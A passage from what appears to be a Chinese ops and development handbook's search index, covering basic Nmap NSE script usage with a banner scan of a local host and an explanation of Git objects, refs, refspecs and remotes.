\u200b\u4f7f\u7528\u200b\u9ed8\u8ba4\u200b\uff08default\uff09\u200b\u8fd9\u4e00\u200b\u5206\u7c7b\u200b\u7684\u200b\u811a\u672c\u200b\u5bf9\u200b\u6307\u5b9a\u200b\u4e3b\u673a\u200b\u6267\u884c\u200b\uff0c\u200b\u80fd\u591f\u200b\u505a\u200b\u4e00\u4e9b\u200b\u57fa\u672c\u200b\u7684\u200b\u4fe1\u606f\u200b\u6536\u96c6\u200b\u4efb\u52a1\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u8981\u200b\u6267\u884c\u200b\u5177\u4f53\u200b\u67d0\u4e2a\u200b\u811a\u672c\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>--script</code> \u200b\u9009\u9879\u200b\u6307\u5b9a\u200b\u811a\u672c\u200b\u540d\u79f0\u200b\u3002\u200b\u4f8b\u5982\u200b\u83b7\u53d6\u200b banner\uff08\u200b\u670d\u52a1\u200b\u7248\u672c\u4fe1\u606f\u200b\uff09\uff1a</p> <pre><code>$ nmap --script=banner 192.168.1.253\nStarting Nmap 7.97 ( https://nmap.org ) at 2025-08-04 01:45 +0800\nNmap scan report for bogon (192.168.1.253)\nHost is up (0.0034s latency).\nNot shown: 999 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n|_banner: SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7\n\nNmap done: 1 IP address (1 host up) scanned in 10.23 seconds\n</code></pre> <p>\u200b\u90e8\u5206\u200b NSE \u200b\u811a\u672c\u200b\u793a\u4f8b\u200b</p> <p>\u200b\u6b63\u5982\u200b\u6700\u200b\u5f00\u59cb\u200b\u6240\u8bf4\u200b\u7684\u200b\u90a3\u6837\u200b\uff0cNmap \u200b\u662f\u200b\u4e00\u4e2a\u200b\u4e2d\u6027\u200b\u7684\u200b\u5de5\u5177\u200b\uff0c\u200b\u5176\u200b\u81ea\u5e26\u200b\u811a\u672c\u200b\u96c6\u200b\u4e5f\u200b\u662f\u200b\u5982\u6b64\u200b\uff1a\u200b\u4e00\u4e9b\u200b\u811a\u672c\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u8c03\u8bd5\u200b\u7528\u9014\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e9b\u200b\u811a\u672c\u200b\u5219\u200b\u975e\u5e38\u200b\u6709\u200b\u653b\u51fb\u6027\u200b\u3002\u200b\u4f8b\u5982\u200b <code>broadcast-dhcp-discover</code> \u200b\u811a\u672c\u200b\u4f1a\u200b\u5e7f\u64ad\u200b\u53d1\u9001\u200b <code>DHCPDISCOVER</code>\uff0c\u200b\u8f93\u51fa\u200b\u5f97\u5230\u200b\u7684\u200b <code>DHCPOFFER</code>\uff0c\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u68c0\u67e5\u200b DHCP \u200b\u670d\u52a1\u5668\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u95ee\u9898\u200b\uff1b\u200b\u800c\u200b <code>ssh-brute</code> \u200b\u5219\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u66b4\u529b\u7834\u89e3\u200b SSH \u200b\u5bc6\u7801\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u8865\u5145\u200b\u9605\u8bfb\u200b Red Hat Blog \u200b\u7684\u200b\u6587\u7ae0\u200b 5 scripts for getting started with the Nmap Scripting Engine \u200b\u4f5c\u4e3a\u200b\u53c2\u8003\u200b\u3002</p>"},{"location":"dev/","title":"\u5f00\u53d1\u200b\u901f\u67e5\u200b\u624b\u518c","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u5f00\u53d1\u200b\u4e0e\u200b\u534f\u4f5c\u200b\u6240\u200b\u9700\u200b\u7684\u200b\u57fa\u7840\u77e5\u8bc6\u200b\u3002\u200b\u53ef\u200b\u5728\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u9009\u62e9\u200b\u60f3\u8981\u200b\u9605\u8bfb\u200b\u7684\u200b\u5177\u4f53\u200b\u7ae0\u8282\u200b\u3002</p>"},{"location":"dev/git/","title":"\u7248\u672c\u200b\u7ba1\u7406\u200b\u4e0e\u200b\u5408\u4f5c","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@tiankaima\u3001@taoky</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u9762\u5411\u200b\u5df2\u7ecf\u200b\u4e86\u89e3\u200b git \u200b\u6700\u200b\u57fa\u672c\u200b\u7684\u200b\u64cd\u4f5c\u200b\u7684\u200b\u7528\u6237\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u4ece\u672a\u200b\u4f7f\u7528\u200b\u8fc7\u200b git\uff0c\u200b\u8bf7\u200b\u53c2\u8003\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u7684\u200b\u5176\u4ed6\u200b\u6559\u7a0b\u200b\uff0c\u200b\u4f8b\u5982\u200b USTC Vlab \u200b\u9879\u76ee\u200b\u7684\u200b Git \u200b\u7b80\u660e\u200b\u6559\u7a0b\u200b\u3002</p>"},{"location":"dev/git/#git","title":"Git \u200b\u4f7f\u7528\u200b\u6280\u5de7","text":""},{"location":"dev/git/#basic-concepts","title":"\u57fa\u672c\u6982\u5ff5","text":""},{"location":"dev/git/#git-object","title":"Object","text":"<p>\u200b\u5bf9\u8c61\u200b\uff08Object\uff09\u200b\u662f\u200b git \u200b\u5b58\u50a8\u200b\u6570\u636e\u200b\u7684\u200b\u57fa\u672c\u200b\u5355\u5143\u200b\uff0c\u200b\u5b58\u50a8\u200b\u5728\u200b <code>.git/objects</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\uff0c\u200b\u4ee5\u200b\u5185\u5bb9\u200b\u7684\u200b SHA-1 \u200b\u503c\u200b\u533a\u5206\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u83b7\u53d6\u200b\u5f53\u524d\u200b git \u200b\u4ed3\u5e93\u200b\u6240\u6709\u200b\u7684\u200b object \u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>$ git cat-file --batch-check --batch-all-objects\n000b2be4f2369ae78f788a92ee3fc00bb3cd64c7 tree 38\n000b50049d29b61c300e4ec2e5cdcce52685861e blob 49457\n000c536877dfda433b574fb37c6dc50048461505 blob 58088\n001fe807cffb8bdb3d9fcd8d98282e596345aee9 tree 183\n002e8efc4f94115882caec99b7b36e6a8f42e616 blob 331\n00344f3b943fa09dde4694487e818f19d84d63f1 blob 67539\n00392bcd6cec7e034d9996e5e17e506b8b7a7644 blob 243\n0040fffeb2037807b75c5b3e69572e6e0e93c309 blob 43519\n0046ec26cf4e99119ec2759d0580b894c1a7f344 tree 258\n004d2057d06042847ca109edd9ca12be7cc255cb tree 409\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>git \u200b\u7684\u200b\u6587\u6863\u200b</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u8bf8\u5982\u200b <code>man git-xxx</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u67e5\u770b\u200b <code>git xxx</code> \u200b\u547d\u4ee4\u200b\u7684\u200b\u6587\u6863\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0a\u9762\u200b\u7684\u200b <code>git cat-file</code> \u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b <code>man git-cat-file</code>\u3002</p> <p>\u200b\u5176\u4e2d\u200b\uff0c<code>blob</code> \u200b\u5bf9\u8c61\u200b\u4ee3\u8868\u200b\u5355\u4e2a\u200b\u6587\u4ef6\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c<code>tree</code> \u200b\u5bf9\u8c61\u200b\u4ee3\u8868\u200b\u76ee\u5f55\u200b\u7ed3\u6784\u200b\uff0c<code>commit</code> \u200b\u5bf9\u8c61\u200b\u4ee3\u8868\u200b\u63d0\u4ea4\u200b\uff0c<code>tag</code> \u200b\u5bf9\u8c61\u200b\u4ee3\u8868\u200b\u6807\u7b7e\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git cat-file -p &lt;SHA-1&gt;</code> \u200b\u67e5\u770b\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\u200b\u4f8b\u5982\u200b\u5bf9\u4e8e\u200b\u672c\u200b\u4ed3\u5e93\u200b hash \u200b\u4e3a\u200b <code>74b5f6330f76d1e464deeff4d29935bba8d48c55</code> \u200b\u7684\u200b\u63d0\u4ea4\u200b\uff1a</p> <p>Commit ID \u200b\u5c31\u662f\u200b Commit Object \u200b\u7684\u200b SHA-1 \u200b\u503c\u200b</p> <pre><code>$ git cat-file -p 74b5f6330f76d1e464deeff4d29935bba8d48c55\ntree 367ba031c357a771f2444048db71d109ec7e76d3\nparent 87d45ab1963b039931f426a1402403996bba0300\nauthor taoky &lt;me@taoky.moe&gt; 1736422437 +0800\ncommitter taoky &lt;me@taoky.moe&gt; 1736422437 +0800\n\nops/storage: Take reciprocal for URE\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u63d0\u4ea4\u200b\u4e2d\u200b\u9664\u4e86\u200b commit \u200b\u5185\u5bb9\u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u200b\u5305\u542b\u200b\u4e86\u200b\uff1a</p> <ul> <li>\u200b\u8fd9\u4e2a\u200b\u63d0\u4ea4\u200b\u5bf9\u5e94\u200b\u7684\u200b\u76ee\u5f55\u200b\u4fe1\u606f\u200b\uff08<code>tree</code>\uff09</li> <li>\u200b\u8fd9\u4e2a\u200b\u63d0\u4ea4\u200b\u7684\u200b\u7236\u200b\u63d0\u4ea4\u200b\uff08<code>parent</code>\uff09\u2014\u2014\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b commit \u200b\u5bf9\u8c61\u200b\u3002<ul> <li>\u200b\u7b2c\u4e00\u4e2a\u200b\u63d0\u4ea4\u200b\u6ca1\u6709\u200b\u7236\u200b\u63d0\u4ea4\u200b\u3002</li> <li>Merge commit \u200b\u6709\u200b\u591a\u4e2a\u200b\u7236\u200b\u63d0\u4ea4\u200b\uff0c\u200b\u4ee3\u8868\u200b\u6765\u81ea\u200b\u4e0d\u540c\u200b\u5206\u652f\u200b\u7684\u200b\u5408\u5e76\u200b\u3002</li> </ul> </li> <li>\u200b\u63d0\u4ea4\u200b\u7684\u200b\u4f5c\u8005\u200b\uff08<code>author</code>\uff09\u200b\u4e0e\u200b\u63d0\u4ea4\u8005\u200b\uff08<code>committer</code>\uff09</li> </ul> <p>\u200b\u4f5c\u8005\u200b\u4e0e\u200b\u63d0\u4ea4\u8005\u200b</p> <p>\u200b\u6ca1\u9519\u200b\uff0ccommit \u200b\u7684\u200b\u4f5c\u8005\u200b\u548c\u200b\u63d0\u4ea4\u8005\u200b\u53ef\u4ee5\u200b\u662f\u200b\u4e24\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b\u4eba\u200b\u3002\u200b\u4e00\u822c\u6765\u8bb2\u200b\uff0c\u200b\u4f5c\u8005\u200b\u662f\u200b\u7f16\u5199\u200b\u539f\u59cb\u200b\u4ee3\u7801\u200b\u7684\u200b\u4eba\u200b\uff0c\u200b\u63d0\u4ea4\u8005\u200b\u662f\u200b\u5b9e\u9645\u200b\u6267\u884c\u200b commit \u200b\u64cd\u4f5c\u200b\u7684\u200b\u4eba\u200b\u3002</p> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u4f5c\u8005\u200b\u548c\u200b\u63d0\u4ea4\u8005\u200b\u90fd\u200b\u4f1a\u200b\u91c7\u7528\u200b <code>git config</code> \u200b\u4e2d\u200b\u7684\u200b\u914d\u7f6e\u200b\u3002\u200b\u4f7f\u7528\u200b <code>git commit --author=\"Name &lt;email&gt;\"</code> \u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u6307\u5b9a\u200b\u4f5c\u8005\u200b\uff0c\u200b\u8bbe\u7f6e\u200b\u73af\u5883\u53d8\u91cf\u200b <code>GIT_COMMITTER_NAME</code> \u200b\u548c\u200b <code>GIT_COMMITTER_EMAIL</code> \u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u6307\u5b9a\u200b\u63d0\u4ea4\u8005\u200b\u3002</p> <p>\u200b\u5176\u4ed6\u200b\u89d2\u8272\u200b</p> <p>\u200b\u9664\u4e86\u200b\u4f5c\u8005\u200b\u4e0e\u200b\u63d0\u4ea4\u8005\u200b\u4ee5\u5916\u200b\uff0c\u200b\u5b8c\u6210\u200b\u5de5\u4f5c\u200b\u7684\u200b\u53ef\u80fd\u200b\u8fd8\u6709\u200b\u5176\u4ed6\u200b\u89d2\u8272\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5408\u4f5c\u8005\u200b\u3001\u200b\u5ba1\u9605\u200b\u8005\u200b\u7b49\u200b\u3002Git \u200b\u672c\u8eab\u200b\u5e76\u200b\u6ca1\u6709\u200b\u63d0\u4f9b\u200b\u8fd9\u4e9b\u200b\u89d2\u8272\u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b commit message \u200b\u6765\u200b\u8bb0\u5f55\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u3002\u200b\u5bf9\u200b\u5408\u4f5c\u8005\u200b\u89d2\u8272\u200b\uff0c\u200b\u6700\u200b\u5e38\u89c1\u200b\u3001\u200b\u6536\u5230\u200b\u5e7f\u6cdb\u652f\u6301\u200b\u7684\u200b\u65b9\u5f0f\u200b\u662f\u200b\u4f7f\u7528\u200b <code>Co-Authored-By</code> \u200b\u6807\u8bb0\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0b\u9762\u200b\u8fd9\u4e2a\u200b\u793a\u4f8b\u200b commit message\uff1a</p> <pre><code>modules: Add a new module\n\nThis module provides a new feature that allows users to do something useful.\n\nCo-Authored-By: Alice &lt;alice@example.com&gt;\nCo-Authored-By: Bob &lt;bob@example.com&gt;\n</code></pre> <p>\u200b\u5728\u200b\u663e\u793a\u200b\u8fd9\u4e2a\u200b commit \u200b\u65f6\u200b\uff0c\u200b\u5e38\u89c1\u200b\u7684\u200b Git \u200b\u5e73\u53f0\u200b\uff08GitHub\u3001GitLab \u200b\u7b49\u200b\uff09\u200b\u4f1a\u200b\u81ea\u52a8\u8bc6\u522b\u200b <code>Co-Authored-By</code> \u200b\u5e76\u200b\u663e\u793a\u200b\u51fa\u6765\u200b\u3002</p> <p>\u200b\u8bf8\u5982\u200b Linux \u200b\u5185\u6838\u200b\u7b49\u200b\u5927\u578b\u9879\u76ee\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u4f7f\u7528\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u5f0f\u200b\u6807\u8bb0\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>Reported-by</code>\u3001<code>Tested-by</code>\u3001<code>Reviewed-by</code> \u200b\u7b49\u200b\u3002</p> <p>\u200b\u800c\u200b tree \u200b\u5bf9\u8c61\u200b\u7684\u200b\u5185\u5bb9\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>$ git cat-file -p 367ba031c357a771f2444048db71d109ec7e76d3\n040000 tree 9ffaaee6a500ec6fe9a8becced39bfcadca6320a    .github\n100644 blob 9331f5dd8db34e1cdc48fe663d662be8c976074c    .gitignore\n100644 blob 6ddd90df33d0b98e704b71f33910ae91152bb005    .markdownlint.jsonc\n100644 blob 7cdbe0b482f604a06a0988dad8877ae8d9257f7d    LICENSE\n100644 blob ab9868d501db1eba893afcff8cb428d9a0cdf534    Makefile\n100644 blob edc9f746d77a497fb08ba2dfac6bdf194b230c12    README.md\n040000 tree e4de763b60a9a9a2ddd5cbf56591e3d187da7d0a    docs\n040000 tree 4afa16d4c6461b534a002b432bdc5218e8826229    includes\n100644 blob 982322412bf8c459de35408c255358ca64705e36    mkdocs.yml\n100644 blob 81ed11cbdb707e57b178605d5aff73fdfa8b0dc4    requirements.txt\n040000 tree a0a863b399b5255c497d35837c2371e3b7f0ed36    scripts\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0ctree \u200b\u5bf9\u8c61\u200b\u5c31\u662f\u200b\u5176\u200b\u5bf9\u5e94\u200b\u76ee\u5f55\u200b\u7684\u200b\u6587\u4ef6\u200b\u5217\u8868\u200b\u3002</p>"},{"location":"dev/git/#git-ref","title":"Ref","text":"<p>\u200b\u5f15\u7528\u200b\uff08Ref\uff09\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6307\u5411\u200b\u5bf9\u8c61\u200b\uff08commit\uff09\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u5b58\u50a8\u200b\u5728\u200b <code>.git/refs</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u3002\u200b\u4e00\u822c\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u51e0\u79cd\u200b\u5f15\u7528\u200b\uff1a</p> <ul> <li>\u200b\u672c\u5730\u200b\u5206\u652f\u200b\uff08<code>refs/heads</code>\uff09</li> <li>\u200b\u8fdc\u7a0b\u200b\u5206\u652f\u200b\uff08<code>refs/remotes</code>\uff09</li> <li>Tag\uff08<code>refs/tags</code>\uff09</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b <code>cat</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u67e5\u770b\u200b\u5f15\u7528\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5bf9\u8c61\u200b SHA-1 \u200b\u503c\u200b\uff0c\u200b\u4f8b\u5982\u200b\u67e5\u770b\u200b\u672c\u5730\u200b <code>master</code> \u200b\u5206\u652f\u200b\u5bf9\u5e94\u200b\u7684\u200b commit\uff1a</p> <pre><code>$ cat .git/refs/heads/master\nd959e182468be92957bd175d189472de91f614c8\n</code></pre> <p>\u200b\u9664\u6b64\u4e4b\u5916\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e9b\u200b\u7279\u6b8a\u200b\u7684\u200b\uff08\u200b\u95f4\u63a5\u200b\u7684\u200b\uff09\u200b\u5f15\u7528\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6587\u4ef6\u200b\u4f4d\u4e8e\u200b <code>.git/</code> \u200b\u4e0b\u200b\uff1a</p> <ul> <li><code>HEAD</code>\uff1a\u200b\u6307\u5411\u200b\u5f53\u524d\u200b\u6240\u5728\u200b\uff08\u200b\u4f60\u200b\u6b63\u5728\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff09\u200b\u5206\u652f\u200b\u7684\u200b\u5f15\u7528\u200b\u3002</li> <li><code>ORIG_HEAD</code>\uff1a\u200b\u6307\u5411\u200b\u4e0a\u200b\u4e00\u6b21\u200b\u64cd\u4f5c\u524d\u200b\u7684\u200b HEAD\u3002</li> <li><code>FETCH_HEAD</code>\uff1a\u200b\u6307\u5411\u200b\u4e0a\u200b\u4e00\u6b21\u200b <code>git fetch</code> \u200b\u64cd\u4f5c\u200b\u7684\u200b\u7ed3\u679c\u200b\u3002</li> <li><code>MERGE_HEAD</code>\uff1a\u200b\u6307\u5411\u200b\u6b63\u5728\u200b\u5408\u5e76\u200b\u7684\u200b\u5206\u652f\u200b\u3002</li> </ul> <p>\u200b\u5176\u4e2d\u200b\u6700\u200b\u91cd\u8981\u200b\u7684\u200b\u662f\u200b <code>HEAD</code>\u3002\u200b\u4f8b\u5982\u200b\uff0c<code>git checkout some-branch</code> \u200b\u5c31\u200b\u4f1a\u200b\u5c06\u200b <code>HEAD</code> \u200b\u6307\u5411\u200b <code>refs/heads/some-branch</code>\uff1b\u200b\u800c\u200b <code>git reset --hard HEAD~1</code> \u200b\u5c31\u200b\u4f1a\u200b\u5c06\u200b <code>HEAD</code> \u200b\u6307\u5411\u200b <code>HEAD~1</code>\uff08\u200b\u540c\u65f6\u200b\u66f4\u65b0\u200b\u5de5\u4f5c\u200b\u76ee\u5f55\u200b\u4e0b\u9762\u200b\u7684\u200b\u6587\u4ef6\u200b\uff09\u3002</p> <p>HEAD~n</p> <p><code>HEAD~n</code> \u200b\u8868\u793a\u200b <code>HEAD</code> \u200b\u7684\u200b\u7b2c\u200b n \u200b\u4e2a\u7236\u200b\u63d0\u4ea4\u200b\uff08\u200b\u524d\u200b n \u200b\u4e2a\u200b\u63d0\u4ea4\u200b\uff09\u3002</p> <p>\u200b\u6bd4\u8f83\u200b\u5dee\u5f02\u200b</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u6bd4\u8f83\u200b\u5f53\u524d\u200b commit \u200b\u76f8\u6bd4\u200b\u4e0a\u200b\u4e00\u4e2a\u200b commit \u200b\u4fee\u6539\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u4e1c\u897f\u200b\uff0c\u200b\u5e94\u8be5\u200b\u8f93\u5165\u200b\u7684\u200b\u547d\u4ee4\u200b\u662f\u200b\uff1f</p> <p>refspec</p> <p>\u200b\u4f60\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5728\u200b <code>.git/config</code> \u200b\u6216\u8005\u200b\u5176\u4ed6\u4eba\u200b\u5199\u200b\u7684\u200b <code>git fetch</code> \u200b\u7b49\u200b\u547d\u4ee4\u200b\u4e2d\u200b\u770b\u5230\u200b\u4ee5\u200b <code>:</code> \u200b\u5206\u5272\u200b\u7684\u200b\u7c7b\u4f3c\u200b\u4e0b\u9762\u200b\u7684\u200b\u4e1c\u897f\u200b\uff1a</p> <pre><code>+refs/heads/*:refs/remotes/origin/*\n</code></pre> <p>\u200b\u8fd9\u200b\u88ab\u200b\u79f0\u4e3a\u200b \"refspec\"\uff0c\u200b\u57fa\u672c\u200b\u683c\u5f0f\u200b\u4e3a\u200b <code>&lt;source&gt;:&lt;destination&gt;</code>\uff0c\u200b\u8868\u793a\u200b\u4ece\u200b <code>&lt;source&gt;</code> \u200b\u83b7\u53d6\u200b\u5bf9\u8c61\u200b\u5e76\u200b\u5b58\u50a8\u200b\u5230\u200b <code>&lt;destination&gt;</code>\u3002\u200b\u5982\u679c\u200b <code>&lt;source&gt;</code> \u200b\u4ee5\u200b <code>+</code> \u200b\u5f00\u5934\u200b\uff0c\u200b\u5219\u200b\u8868\u793a\u200b\u5f3a\u5236\u200b\u8986\u76d6\u200b\u3002\u200b\u4e0a\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u8868\u793a\u200b\u5c06\u200b\u8fdc\u7a0b\u200b\u4ed3\u5e93\u200b\u4e2d\u200b <code>refs/heads</code> \u200b\u4e0b\u200b\u7684\u200b\u6240\u6709\u200b\u5206\u652f\u200b\u83b7\u53d6\u200b\u5230\u200b\u672c\u5730\u200b\u7684\u200b <code>refs/remotes/origin</code> \u200b\u4e0b\u200b\uff0c\u200b\u5373\u200b <code>git fetch</code> \u200b\u7684\u200b\u9ed8\u8ba4\u200b\u884c\u4e3a\u200b\u3002</p> <p><code>git push</code> \u200b\u540c\u6837\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u63a5\u53d7\u200b refspec\uff0c\u200b\u9ed8\u8ba4\u200b\u7684\u200b <code>push.default</code> \u200b\u914d\u7f6e\u200b\u9879\u200b\u7684\u200b\u503c\u200b\u4e3a\u200b <code>simple</code>\uff0c\u200b\u8868\u793a\u200b\u5c06\u200b\u5f53\u524d\u200b\u5206\u652f\u200b\u63a8\u9001\u200b\u5230\u200b\u4e0e\u5176\u200b\u540c\u540d\u200b\u7684\u200b\u8fdc\u7a0b\u200b\u5206\u652f\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b <code>refs/heads/&lt;some-branch&gt;:refs/heads/&lt;some-branch&gt;</code>\uff08\u200b\u628a\u200b <code>&lt;source&gt;</code> \u200b\u7684\u200b\u5bf9\u8c61\u200b\u63a8\u9001\u200b\u5230\u200b\u8fdc\u7a0b\u200b\u7684\u200b <code>&lt;destination&gt;</code> \u200b\u4e0a\u200b\uff09\u3002</p> <p>\u200b\u66f4\u200b\u591a\u200b\u4fe1\u606f\u200b\u53ef\u200b\u9605\u8bfb\u200b Git Book \u200b\u7684\u200b 10.5 \u200b\u8282\u200b \u200b\u4e0e\u200b git-fetch(1)\u3002</p> <p><code>git reflog</code></p> <p>Reflogs\uff08Reference logs\uff09\u200b\u8bb0\u5f55\u200b\u4e86\u200b git \u200b\u64cd\u4f5c\u200b\u4e2d\u200b ref \u200b\u7684\u200b\u66f4\u65b0\u200b\u5386\u53f2\u200b\uff0c\u200b\u5728\u200b\u9700\u8981\u200b\u4ece\u200b\u8bef\u64cd\u4f5c\u200b\u6062\u590d\u200b\uff0c\u200b\u6216\u200b\u786e\u8ba4\u200b\u4e4b\u524d\u200b\u64cd\u4f5c\u200b\u7ed9\u200b ref \u200b\u5e26\u6765\u200b\u7684\u200b\u53d8\u5316\u200b\u65f6\u200b\u975e\u5e38\u200b\u6709\u7528\u200b\u3002\u200b\u4f8b\u5b50\u200b\u53c2\u8003\u200b Hackergame 2023 \u200b\u7684\u200b \"Git? Git!\" \u200b\u4e00\u200b\u9898\u200b\u3002</p>"},{"location":"dev/git/#git-remote","title":"Remote","text":"<p>\u200b\u7edd\u5927\u90e8\u5206\u200b\u65f6\u5019\u200b\u6211\u4eec\u200b\u90fd\u200b\u6709\u200b\u672c\u5730\u200b\u4e0e\u200b\u8fdc\u7a0b\u200b\u4ed3\u5e93\u200b\u4ea4\u4e92\u200b\u7684\u200b\u9700\u6c42\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u4e5f\u200b\u4ecb\u7ecd\u200b\u4e0e\u200b remote \u200b\u76f8\u5173\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cremote \u200b\u7684\u200b\u540d\u5b57\u200b\u662f\u200b <code>origin</code>\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>git remote</code> \u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u7684\u200b remote \u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>$ git remote\norigin\n</code></pre> <p>\u200b\u6bd4\u8f83\u200b\u5e38\u7528\u200b\u7684\u200b\u76f8\u5173\u200b\u547d\u4ee4\u200b\uff1a</p> <ul> <li><code>git remote add &lt;name&gt; &lt;url&gt;</code>\uff1a\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b remote</li> <li><code>git remote get-url &lt;name&gt;</code>\uff1a\u200b\u83b7\u53d6\u200b remote \u200b\u7684\u200b URL</li> <li><code>git remote set-url &lt;name&gt; &lt;url&gt;</code>\uff1a\u200b\u8bbe\u7f6e\u200b remote \u200b\u7684\u200b URL</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git fetch &lt;remote&gt;</code> \u200b\u4ece\u200b\u8fdc\u7a0b\u200b\u4ed3\u5e93\u200b\u62c9\u53d6\u200b\u6700\u65b0\u200b\u7684\u200b commit\u2014\u2014\u200b\u6ce8\u610f\u200b\u8fd9\u4e2a\u200b\u547d\u4ee4\u200b\u53ea\u4f1a\u200b\u66f4\u65b0\u200b\u8fdc\u7a0b\u200b\u5206\u652f\u200b\u76f8\u5173\u200b\u5bf9\u8c61\u200b\u4ee5\u53ca\u200b ref\u3002\u200b\u4e4b\u540e\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git merge</code> \u200b\u5c06\u200b\u8fdc\u7a0b\u200b\u5206\u652f\u200b\u5408\u5e76\u200b\u5230\u200b\u672c\u5730\u200b\u5206\u652f\u200b\uff08\u200b\u5e76\u200b\u66f4\u65b0\u200b\u672c\u5730\u200b\u5206\u652f\u200b\u7684\u200b ref\uff09\u3002\u200b\u56e0\u6b64\u200b\uff0c<code>git pull origin master</code> \u200b\u7b49\u4ef7\u200b\u4e8e\u200b <code>git fetch origin master &amp;&amp; git merge origin/master</code>\u3002</p> <p>\u200b\u8ba9\u200b\u672c\u5730\u200b\u5206\u652f\u200b\u4e0e\u200b\u8fdc\u7a0b\u200b\u4e00\u81f4\u200b</p> <p>\u200b\u6709\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u7684\u200b\u672c\u5730\u200b\u5206\u652f\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4e0e\u200b\u8fdc\u7a0b\u200b\u4e0d\u200b\u4e00\u81f4\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u8ba9\u200b\u672c\u5730\u200b\u5206\u652f\u200b\u4e0e\u200b\u8fdc\u7a0b\u200b\u4e00\u81f4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u600e\u4e48\u200b\u505a\u200b\u5462\u200b\uff1f</p> 